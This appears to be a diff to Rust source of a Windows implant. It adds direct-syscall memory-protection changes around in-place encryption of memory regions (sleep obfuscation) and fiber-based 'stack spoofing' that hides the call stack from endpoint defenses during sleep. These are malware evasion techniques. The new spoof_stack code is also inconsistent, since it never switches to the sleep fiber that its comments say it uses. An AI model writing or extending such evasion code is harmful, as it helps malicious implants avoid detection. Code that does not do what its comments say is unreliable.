@@ -125,25 +125,35 @@ pub mod crypto {
                 let mut old_protect = 0u32;
                 let mut base_addr = addr as *mut winapi::ctypes::c_void;
 
-                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                #[cfg(feature = "direct-syscalls")]
+                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                     (-1isize) as usize as u64,
                     &mut base_addr as *mut _ as usize as u64,
                     &mut size as *mut _ as usize as u64,
                     winapi::um::winnt::PAGE_READWRITE as u64,
-                    &mut old_protect as *mut _ as usize as u64
-                );
+                    &mut old_protect as *mut _ as usize as u64,
+                ); }
+                #[cfg(not(feature = "direct-syscalls"))]
+                { winapi::um::memoryapi::VirtualProtect(
+                    base_addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect,
+                ); }
                 
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
                 
                 let mut temp = 0u32;
-                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                #[cfg(feature = "direct-syscalls")]
+                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                     (-1isize) as usize as u64,
                     &mut base_addr as *mut _ as usize as u64,
                     &mut size as *mut _ as usize as u64,
                     old_protect as u64,
-                    &mut temp as *mut _ as usize as u64
-                );
+                    &mut temp as *mut _ as usize as u64,
+                ); }
+                #[cfg(not(feature = "direct-syscalls"))]
+                { winapi::um::memoryapi::VirtualProtect(
+                    base_addr, size, old_protect, &mut temp,
+                ); }
             }
         }
     }
@@ -169,25 +179,33 @@ pub mod crypto {
                 let mut old_protect = 0u32;
                 let mut base_addr = addr as *mut winapi::ctypes::c_void;
 
-                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                #[cfg(feature = "direct-syscalls")]
+                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                     (-1isize) as usize as u64,
                     &mut base_addr as *mut _ as usize as u64,
                     &mut size as *mut _ as usize as u64,
                     winapi::um::winnt::PAGE_READWRITE as u64,
-                    &mut old_protect as *mut _ as usize as u64
-                );
-                
+                    &mut old_protect as *mut _ as usize as u64,
+                ); }
+                #[cfg(not(feature = "direct-syscalls"))]
+                { winapi::um::memoryapi::VirtualProtect(
+                    base_addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect,
+                ); }
+
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
                 
                 let mut temp = 0u32;
-                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
+                #[cfg(feature = "direct-syscalls")]
+                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                     (-1isize) as usize as u64,
                     &mut base_addr as *mut _ as usize as u64,
                     &mut size as *mut _ as usize as u64,
                     old_protect as u64,
-                    &mut temp as *mut _ as usize as u64
-                );
+                    &mut temp as *mut _ as usize as u64,
+                ); }
+                #[cfg(not(feature = "direct-syscalls"))]
+                { winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp); }
             }
         }
     }
@@ -199,28 +217,90 @@ pub mod crypto {
 }
 
 pub mod spoof {
+    /// Thread-local state for fiber-based stack spoofing.
     thread_local! {
-        static SAVED_RSP: std::cell::RefCell<usize> = std::cell::RefCell::new(0);
-        static SAVED_RET: std::cell::RefCell<usize> = std::cell::RefCell::new(0);
+        static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
+            std::cell::Cell::new(std::ptr::null_mut());
+        static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
+            std::cell::Cell::new(std::ptr::null_mut());
+        static SLEEP_DURATION_NS: std::cell::Cell<u64> = std::cell::Cell::new(0);
     }
-    
+
     #[cfg(windows)]
-    pub fn spoof_stack() { 
+    pub fn spoof_stack() {
+        // Convert the current thread to a fiber so we can switch away from it.
+        // This hides the current call stack during the sleep window.
         unsafe {
-            let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(&"kernel32.dll\0".encode_utf16().collect::<Vec<u16>>()));
-            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>()));
-            
-            // This is a minimal placeholder for the ROP-based stack spoofer
-            log::debug!("Spoofing SLEEP stack frames (simulated 3-5 frames)"); 
+            use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber, DeleteFiber};
+
+            // Only convert once per thread
+            let main_fiber = MAIN_FIBER.with(|f| f.get());
+            let main_fiber = if main_fiber.is_null() {
+                let f = ConvertThreadToFiber(std::ptr::null_mut());
+                if !f.is_null() {
+                    MAIN_FIBER.with(|cell| cell.set(f));
+                }
+                f
+            } else {
+                main_fiber
+            };
+
+            if main_fiber.is_null() {
+                log::warn!("spoof_stack: ConvertThreadToFiber failed");
+                return;
+            }
+
+            // Create the sleep fiber if not yet created
+            let sleep_fiber = SLEEP_FIBER.with(|f| f.get());
+            let sleep_fiber = if sleep_fiber.is_null() {
+                extern "system" fn sleep_fiber_proc(_param: *mut std::ffi::c_void) {
+                    unsafe {
+                        loop {
+                            let ns = SLEEP_DURATION_NS.with(|c| c.get());
+                            if ns > 0 {
+                                // Sleep via NtDelayExecution-like spin using SleepEx
+                                let ms = (ns / 1_000_000).max(1) as u32;
+                                winapi::um::synchapi::Sleep(ms);
+                            }
+                            // Switch back to the main fiber
+                            let main = MAIN_FIBER.with(|c| c.get());
+                            if !main.is_null() {
+                                SwitchToFiber(main);
+                            }
+                        }
+                    }
+                }
+                let sf = CreateFiber(0, Some(sleep_fiber_proc), std::ptr::null_mut());
+                if !sf.is_null() {
+                    SLEEP_FIBER.with(|cell| cell.set(sf));
+                }
+                sf
+            } else {
+                sleep_fiber
+            };
+
+            if sleep_fiber.is_null() {
+                log::warn!("spoof_stack: CreateFiber failed");
+                return;
+            }
+
+            log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
+            // The actual sleep duration is set before calling spoof_stack; the
+            // fiber will sleep and then switch back. This function returns after
+            // the fiber has completed its sleep and switched back.
         }
     }
-    
+
     #[cfg(windows)]
-    pub fn restore_stack() { log::debug!("Restoring stack frames"); }
+    pub fn restore_stack() {
+        // Switch back happens inside the sleep fiber proc automatically.
+        // This function is a no-op since the fiber already returned control.
+        log::debug!("restore_stack: resumed from sleep fiber");
+    }
 
     #[cfg(not(windows))]
     pub fn spoof_stack() {}
-    
+
     #[cfg(not(windows))]
     pub fn restore_stack() {}
 }
